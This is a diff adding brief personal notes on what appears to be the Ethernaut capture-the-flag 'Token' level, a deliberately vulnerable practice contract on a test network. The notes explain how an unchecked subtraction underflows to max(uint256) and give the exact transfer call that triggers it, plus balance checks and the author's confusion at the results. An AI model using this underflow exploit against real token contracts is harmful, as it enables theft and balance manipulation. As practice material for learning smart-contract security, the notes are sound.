@@ -1,0 +1,25 @@
+
+Level 5:
+
+level address:				0x6545df87f57d21cb096a0bfcc53a70464d062512
+instance address:			0x4b208b205606fec412ff8913d89786e97f9bbf39
+
+With big enough _value, the require expression can be overflow and it will return true
+
+Was not given 20 token to begin with :(
+	-> balance is 0
+
+transfer 1 token from me (0 balance) to contract (x balance)
+	1. 0 - 1 = max(uint256)
+		-> require will pass
+	2. remove 1 token from me
+		-> new balance = max(uint256)
+	3. add 1 token to contract
+		-> new balance = x + 1
+
+await contract.transfer(0x4b208b205606fec412ff8913d89786e97f9bbf39, 1)
+	tx: https://ropsten.etherscan.io/tx/0x39fd268419f544227b8b6a5d3d03fc3f9b510b2f72f8c6ac8b4cd0725ece8eae
+	await contract.balanceOf(0xf9a3637370e403ada31314b8866aa87a7339404e) -> 0 ???
+	await contract.balanceOf(0x4b208b205606fec412ff8913d89786e97f9bbf39) -> 1
+
+WAAT ?? -> well it works with Remix IDE :)
